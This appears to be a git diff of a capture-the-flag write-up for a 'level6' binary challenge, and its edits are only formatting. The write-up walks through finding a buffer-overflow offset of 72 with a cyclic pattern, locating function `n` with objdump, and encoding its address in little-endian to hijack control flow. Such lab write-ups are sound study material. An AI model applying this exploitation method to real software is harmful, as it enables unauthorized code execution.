@@ -1,4 +1,4 @@
-We start by opening the binary in dogbolt here we see that we must call `n` to trigger the `cat`.
+We start by opening the binary in [dogbolt](https://dogbolt.org/) here we see that we must call `n` to trigger the `cat`.
 
 We search the offset using a pattern generator like : [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator)
 
@@ -12,9 +12,11 @@ Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1A
 Program received signal SIGSEGV, Segmentation fault.
 0x41346341 in ?? ()
 ```
-When we put 0x41346341 in wiremask it find an offset of 72. 
+
+When we put 0x41346341 in wiremask it find an offset of 72.
 
 We search `n`:
+
 ```Shell
 objdump -t level6
 ...
@@ -23,6 +25,7 @@ objdump -t level6
 0804982c g       *ABS*  00000000              _edata
 ...
 ```
+
 address of `n` : 08048454
 little-endian : /x54/x84/x04/x08
 
